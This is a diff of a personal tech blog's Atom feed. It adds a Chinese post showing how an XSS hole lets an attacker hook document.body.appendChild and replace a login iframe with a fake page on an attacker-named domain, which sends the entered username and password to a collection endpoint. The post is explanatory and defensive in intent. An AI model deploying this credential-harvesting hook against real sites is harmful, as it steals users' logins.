@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://Evalotus.github.io/"/>
-  <updated>2019-02-14T09:40:14.954Z</updated>
+  <updated>2019-02-18T08:53:30.695Z</updated>
   <id>https://Evalotus.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>「 安全 」从iframe说到万物皆可hook</title>
+    <link href="https://Evalotus.github.io/2019/02/15/%E4%BB%8Eiframe%E5%AE%89%E5%85%A8%E8%AF%B4%E5%88%B0%E4%B8%87%E7%89%A9%E7%9A%86%E5%8F%AFhook/"/>
+    <id>https://Evalotus.github.io/2019/02/15/从iframe安全说到万物皆可hook/</id>
+    <published>2019-02-15T09:06:31.000Z</published>
+    <updated>2019-02-18T08:53:30.695Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：</p><blockquote><p>如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。</p></blockquote><p>what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！</p><p>作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>但是作为一个与用户交互最紧密的前端，登录页总是302跳转到新的页面对于用户来说其实是非常不友好的，打断了用户操作，跳过去跳过来的都晕了，如果能够弹窗登录，那抢手机的路上将一气呵成，非常愉快呀！<br>弹窗登录一般都是 iframe 实现的，因为大家一般都是 sso 登录，也就是说要做出一个通用的框架，所以一般使用 iframe。</p><p>我弱弱的说了句，嗯，百度好像也是 iframe 呀，其他也有很多厂商是 iframe 的，这样的问题并不是很严重吧。<br>没想到大佬们立刻就开始研究百度的弹窗。结论是：<br>做的很巧妙啊！点击之后才出弹窗，xss 一般都是一开始就进行篡改，但是这种方式的话，坏人没办法获取用户点击【登录】的时机，这样应该没那么容易篡改。</p><h4 id="万物皆可hook"><a href="#万物皆可hook" class="headerlink" title="万物皆可hook"></a>万物皆可hook</h4><p>听得有点懵，后来才明白，他们就是想hook用户点击登录的click事件。</p><p>哈哈，术业有专攻。终于轮到我们前端大展身手的时候了，他们是不知道我们的【万物皆可hook】定理。</p><p>千千音乐盒为例：<br><img src="/images/qian1.png" alt=""></p><p>点击登录之后，弹出了iframe，这时候一般都会有服务器交互，我们先看看chrome devtool的network，但是出现了好多条请求。这时候我们右键单击审查元素，看看iframe的src，其实凭经验来说，这种弹窗一般都是调用document.body.appendChild来添加在页面中，但是有更好的方法来佐证。</p><p><img src="/images/qian3.png" alt=""><br>重要小tips：network中的Initiator会展示出发出请求的具体代码行数，点击一下就可以定位到具体是哪一行发出了这个请求。代码一般都压缩了的，点击下面的{}就可以格式化代码。果不其然，就是调用了appendChild，再看下html结构，显然是在append在body中的。</p><p>感兴趣的可以查看chrome devTool的使用（TODO）。</p><p>既然锁定了调用的是document.body.appendChild，那我们就可以放心的hook啦！<br>核心代码很简单，就是使用了js的call方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'hook success'</span>);</span><br><span class="line">  append.call(<span class="built_in">document</span>.body, el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们成功的hook了document.body.appendChild方法，在执行原来操作方式之前执行了我们的alert。</p><p>大佬要求我完整的实现隐藏原来的弹窗，弹出自己实现的弹窗。</p><p>那代码量应该不少吧。我们xss只能插入js，插入不了css，即使实现了也应该很丑吧。</p><p>no，no，no。</p><p>js啥都能插入!</p><p>html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fakeIframe = document.createElement(&apos;div&apos;);</span><br></pre></td></tr></table></figure><p>css</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.style= &apos;border:1px solid #f8f8f8&apos;;</span><br></pre></td></tr></table></figure><p>就是需要写好多dom操作的代码。</p><p>or 直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.innerHTML=&apos;&lt;iframe allowtransparency=&quot;true&quot; style=&quot;border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;&quot;</span><br><span class="line">src=&quot;//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;amp;u=https%3A%2F%2Fplay.taihe.com&amp;amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;amp;callback=tpass15504710495271&amp;amp;tpl=baidu_music&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。<br>打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。<br>加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.tpass-button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/badEva/collect'</span>,</span><br><span class="line">    type: <span class="string">'POST'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      username: $(<span class="string">'.tpass-text-input-userName'</span>).val(),</span><br><span class="line">      pwd: $(<span class="string">'.tpass-text-input-password'</span>).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fakeIframe = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  fakeIframe.innerHTML = <span class="string">'&lt;iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" &gt;&lt;/iframe&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上四行代码就可以搞定了。</p><p>其实还有很多技术点可以细挖，先不展开说了。</p><h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>回想起来，这些思路还是来自于hook极验验证结果时得出来的。</p><p>引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？</p><p>大家都说，页面都是你的页面，连个结果都获取不到？？？</p><p>计算每次的轨迹？</p><p>思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。</p><p>我的地盘我做主，怎么可能获取不到呢？</p><p>脑子里又闪过hook这个词。</p><p>对了，他们总是要给服务端结果的啊！hook他们的请求！</p><p>跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。</p><p>但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。</p><p>但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。</p><p>几乎是防不胜防。</p><p>所以更是提醒我们为了安全：</p><p>1.要尽量避免xss漏洞，请看这篇（TODO）</p><p>2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。</p><p>从这篇文章获取到的，你可以自己总结下。<br>顺便思考下hook Ajax的方法。</p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>虽然很绝望，但是首先，你需要一个xss漏洞。</p><p>大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。</p><p>iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h4&gt;&lt;p&gt;今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！&lt;/p&gt;
+&lt;p&gt;作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="安全" scheme="https://Evalotus.github.io/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>「 puppeteer 」从puppeteer谈前端爬虫检测和绕过</title>
@@ -226,6 +251,26 @@
   </entry>
   
   <entry>
+    <title>「 产品 」极简小程序产品设计笔记</title>
+    <link href="https://Evalotus.github.io/2018/10/12/%E6%9E%81%E7%AE%80%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
+    <id>https://Evalotus.github.io/2018/10/12/极简小程序产品设计笔记/</id>
+    <published>2018-10-12T10:26:01.000Z</published>
+    <updated>2019-02-14T09:04:45.209Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的<a href="https://www.youzan.com" target="_blank" rel="noopener">有赞</a>的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。<br>这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了<strong>提高审美，学习成为一个设计师的基本技能</strong>，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。</p><a id="more"></a><h4 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h4><p>从六年前开始接触极简主义生活方式，如果你要让我说极简主义的好，我可以说三天三夜，哈哈，这里就不赘述，留到产品中去体现。<br>因为最近经济形势不好，消费降级突然变得流行起来，现在我的豆瓣timeline中有无数的人开始安利极简生活。</p><p>如果你要问我极简是什么？我会说极简是寻找生活的最优解，入了极简主义可以大概率保证你的人生一直走上坡路，我相信极简一定会贯穿我整个生命。<br>一直想自己做个什么项目，想着热爱整理的我，每天整理一百遍，把自己所有的物品都进行统计盘点，希望有个方便的进行物品盘点的小程序。</p><p>产品方面，18年学习了<a href="https://book.douban.com/subject/25915629/" target="_blank" rel="noopener">破茧成蝶：用户体验设计师的成长之路</a>，妥协的完美主义，绝密原型档案，<a href="https://book.douban.com/subject/4723970/" target="_blank" rel="noopener">人人都是产品经理</a>，得到上的梁宁产品30讲，希望可以全面实践下。</p><h4 id="项目总览"><a href="#项目总览" class="headerlink" title="项目总览"></a>项目总览</h4><p>在平常的工作中项目大概也会分为这三个部分。<br>1.管理后台<br>CRUD，主要是增删改查数据，权限控制等。<br>技术栈：<br>vue的element-ui，有现成的管理后端的模版 <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">vue-element-admin</a><br>node express+mongoose<br>2.小程序<br><a href="https://github.com/Meituan-Dianping/mpvue" target="_blank" rel="noopener">mpvue</a> 和 <a href="https://github.com/Tencent/wepy" target="_blank" rel="noopener">wepy</a> 各有优劣，wepy因为是官方支持，用的会比较多一点。<br><a href="https://github.com/aben1188/awesome-wepy" target="_blank" rel="noopener">awesome-wepy</a> 有很多小程序源码可以学习。<br><a href="https://github.com/dyq086/wepy-mall" target="_blank" rel="noopener">一个电商小程序的全功能源码</a><br>3.web页<br>暂定只是一个介绍页，以后可以加入其他的信息。<br>前后端分离响应式。</p><p>本文会持续更新产品进度。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的&lt;a href=&quot;https://www.youzan.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;有赞&lt;/a&gt;的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。&lt;br&gt;这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了&lt;strong&gt;提高审美，学习成为一个设计师的基本技能&lt;/strong&gt;，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="产品" scheme="https://Evalotus.github.io/tags/%E4%BA%A7%E5%93%81/"/>
+    
+  </entry>
+  
+  <entry>
     <title>「 微信开发 」手机浏览器唤起微信app登录的可行性</title>
     <link href="https://Evalotus.github.io/2018/10/12/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91%E5%AE%9E%E7%94%A8%E6%8C%87%E5%8D%973-%E6%89%8B%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%99%A8%E5%94%A4%E8%B5%B7%E5%BE%AE%E4%BF%A1app%E7%99%BB%E5%BD%95%E7%9A%84%E5%8F%AF%E8%A1%8C%E6%80%A7/"/>
     <id>https://Evalotus.github.io/2018/10/12/微信开发实用指南3-手机浏览器唤起微信app登录的可行性/</id>
@@ -243,26 +288,6 @@
     
     
       <category term="微信开发" scheme="https://Evalotus.github.io/tags/%E5%BE%AE%E4%BF%A1%E5%BC%80%E5%8F%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>「 产品 」极简小程序产品设计笔记</title>
-    <link href="https://Evalotus.github.io/2018/10/12/%E6%9E%81%E7%AE%80%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
-    <id>https://Evalotus.github.io/2018/10/12/极简小程序产品设计笔记/</id>
-    <published>2018-10-12T10:26:01.000Z</published>
-    <updated>2019-02-14T09:04:45.209Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的<a href="https://www.youzan.com" target="_blank" rel="noopener">有赞</a>的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。<br>这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了<strong>提高审美，学习成为一个设计师的基本技能</strong>，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。</p><a id="more"></a><h4 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h4><p>从六年前开始接触极简主义生活方式，如果你要让我说极简主义的好，我可以说三天三夜，哈哈，这里就不赘述，留到产品中去体现。<br>因为最近经济形势不好，消费降级突然变得流行起来，现在我的豆瓣timeline中有无数的人开始安利极简生活。</p><p>如果你要问我极简是什么？我会说极简是寻找生活的最优解，入了极简主义可以大概率保证你的人生一直走上坡路，我相信极简一定会贯穿我整个生命。<br>一直想自己做个什么项目，想着热爱整理的我，每天整理一百遍，把自己所有的物品都进行统计盘点，希望有个方便的进行物品盘点的小程序。</p><p>产品方面，18年学习了<a href="https://book.douban.com/subject/25915629/" target="_blank" rel="noopener">破茧成蝶：用户体验设计师的成长之路</a>，妥协的完美主义，绝密原型档案，<a href="https://book.douban.com/subject/4723970/" target="_blank" rel="noopener">人人都是产品经理</a>，得到上的梁宁产品30讲，希望可以全面实践下。</p><h4 id="项目总览"><a href="#项目总览" class="headerlink" title="项目总览"></a>项目总览</h4><p>在平常的工作中项目大概也会分为这三个部分。<br>1.管理后台<br>CRUD，主要是增删改查数据，权限控制等。<br>技术栈：<br>vue的element-ui，有现成的管理后端的模版 <a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">vue-element-admin</a><br>node express+mongoose<br>2.小程序<br><a href="https://github.com/Meituan-Dianping/mpvue" target="_blank" rel="noopener">mpvue</a> 和 <a href="https://github.com/Tencent/wepy" target="_blank" rel="noopener">wepy</a> 各有优劣，wepy因为是官方支持，用的会比较多一点。<br><a href="https://github.com/aben1188/awesome-wepy" target="_blank" rel="noopener">awesome-wepy</a> 有很多小程序源码可以学习。<br><a href="https://github.com/dyq086/wepy-mall" target="_blank" rel="noopener">一个电商小程序的全功能源码</a><br>3.web页<br>暂定只是一个介绍页，以后可以加入其他的信息。<br>前后端分离响应式。</p><p>本文会持续更新产品进度。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近有小伙伴给介绍小程序的私活，虽然功能需求很简单，但是从0-1完全定制化搭建成本很高，需要租用服务器，专门进行UI设计等，还有后续维护的工作，其实对于个体商户本身他们并不需要如此高度的产品定制化。遂去看了下专门做这个的&lt;a href=&quot;https://www.youzan.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;有赞&lt;/a&gt;的后台，做成一个产品完全可以复用，批量搭建速度快，成本低。&lt;br&gt;这次机会的错过引起了我的反思，工作这么多年尚未从0开始前后端自己一个人完成一整个平台，今年的OKR除了&lt;strong&gt;提高审美，学习成为一个设计师的基本技能&lt;/strong&gt;，还希望能够为极简主义的同好们制作一个极简主义专用的小程序。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="产品" scheme="https://Evalotus.github.io/tags/%E4%BA%A7%E5%93%81/"/>
     
   </entry>
   
@@ -403,26 +428,6 @@
     <summary type="html">
     
       &lt;p&gt;本系列是学习整理js中的面向对象的第3篇，原型和构造函数的关系，接下来就要更深入的探究其中的原理了。&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="javascript" scheme="https://Evalotus.github.io/tags/javascript/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>JS中的面向对象2-new操作符做了什么</title>
-    <link href="https://Evalotus.github.io/2018/06/22/JS%E4%B8%AD%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A12-new%E6%93%8D%E4%BD%9C%E7%AC%A6%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/"/>
-    <id>https://Evalotus.github.io/2018/06/22/JS中的面向对象2-new操作符做了什么/</id>
-    <published>2018-06-22T10:00:51.000Z</published>
-    <updated>2019-02-14T09:18:25.169Z</updated>
-    
-    <content type="html"><![CDATA[<p>本系列是学习整理js中的面向对象的第2篇，new操作符做了什么<br><a id="more"></a></p><p>new运算符的作用是创建一个类的实例（类可以是我们自定义的对象类型Person，也可以是具有构造函数的内置对象（如Object，Array，Function））</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Person(age,name)&#123;</span><br><span class="line">this.age = age;</span><br><span class="line">this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">var instance =new Person();</span><br><span class="line"></span><br><span class="line">var o1 = new Object();</span><br></pre></td></tr></table></figure><p>实际经历4个步骤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var instance=new Person();</span><br><span class="line">// 实际经历了如下四步：</span><br><span class="line"></span><br><span class="line">// 1.创建空对象</span><br><span class="line">var instance = new Object();</span><br><span class="line"></span><br><span class="line">// 2.设置原型链，指向类【构造函数】的原型</span><br><span class="line">instance.__proto__ = Person.prototype;</span><br><span class="line"></span><br><span class="line">// 3.让构造函数Person的this指向实例instance,执行构造函数Person的函数体</span><br><span class="line">var p = Person.call(instance);</span><br><span class="line"></span><br><span class="line">// 4.判断Person的返回值类型</span><br><span class="line">// 值类型就不要了，还是返回instance</span><br><span class="line">// 如果是引用类型，替换掉instance返回引用类型</span><br><span class="line">if(typeof p ==&apos;object&apos;)&#123;</span><br><span class="line"> return p </span><br><span class="line">&#125;else&#123;</span><br><span class="line"> return instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如果把随便一个函数当作构造函数，用new来调用"><a href="#如果把随便一个函数当作构造函数，用new来调用" class="headerlink" title="如果把随便一个函数当作构造函数，用new来调用"></a>如果把随便一个函数当作构造函数，用new来调用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 返回值类型</span><br><span class="line">function say(name) &#123;</span><br><span class="line">  console.log(name);</span><br><span class="line">  // return name; 加不加这个都返回空的say类型的obj:&#123;&#125;,没有return 相当于return undefined，值类型，丢弃。</span><br><span class="line">&#125;</span><br><span class="line">var instance = new say(&apos;Eva&apos;); // 同上返回say类型的obj:&#123;&#125;</span><br><span class="line"></span><br><span class="line">instance instanceof say; // true</span><br><span class="line">instance.__proto__ === say.prototype; // true</span><br><span class="line"></span><br><span class="line">function CreatePerson(age, name) &#123;</span><br><span class="line">  var p = &#123; age: age, name: name &#125;;</span><br><span class="line">  return p; // 返回引用类型，原有的实例被丢弃，因为原有的instance被丢弃</span><br><span class="line">  // 此处的实例和CreatPerson并无原型链的关系，只是普通的Object对象</span><br><span class="line">  // 所以可以理解上文中的寄生模式和稳妥模式都不再有原型链关系的原因啦。简言之，new无效则原型无效</span><br><span class="line">&#125;</span><br><span class="line">var p = new CreatePerson(11, &apos;Eva&apos;); // &#123;age: 11, name: &quot;Eva&quot;&#125; 但是注意此处不是CreatePerson类的对象了，就是普通的Object对象</span><br><span class="line"></span><br><span class="line">p.__proto__ == CreatePerson.prototype // false;</span><br></pre></td></tr></table></figure><h4 id="new的实现"><a href="#new的实现" class="headerlink" title="new的实现"></a>new的实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function New(fn) &#123;</span><br><span class="line"></span><br><span class="line">  /*1*/</span><br><span class="line">  var instance = &#123; &apos;__proto__&apos;: fn.prototype &#125;; // 每个对象天生自带__proto__属性，此处只是重新指定了</span><br><span class="line"></span><br><span class="line">  return function() &#123;</span><br><span class="line">    /*2*/</span><br><span class="line">    var res = fn.apply(instance, arguments);</span><br><span class="line">    /*3*/</span><br><span class="line">    if (typeof res == &apos;object&apos;) &#123;</span><br><span class="line">      return res;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return instance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Person(age, name) &#123;</span><br><span class="line">  this.age = age;</span><br><span class="line">  this.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 调用</span><br><span class="line">New(Person)(11, &apos;Eva&apos;);</span><br></pre></td></tr></table></figure><h4 id="无new调用"><a href="#无new调用" class="headerlink" title="无new调用"></a>无new调用</h4><p>构造函数也是函数，可以直接调用，为了避免忘记通过new来调用构造函数，导致属性和方法添加在window对象上，污染全局变量，一般会在构造函数中检查当前作用域，这样即使不通过new来生成实例也可以得到正确的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function Person(age, name) &#123;</span><br><span class="line">  if (this instanceof Person) &#123;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.name = name;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return new Person(age, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解了new的实际作用，就不难理解原型对象的实现了</p><p>参考文献：</p><p><a href="https://www.zhihu.com/question/36440948" target="_blank" rel="noopener">https://www.zhihu.com/question/36440948</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;本系列是学习整理js中的面向对象的第2篇，new操作符做了什么&lt;br&gt;
     
     </summary>
     
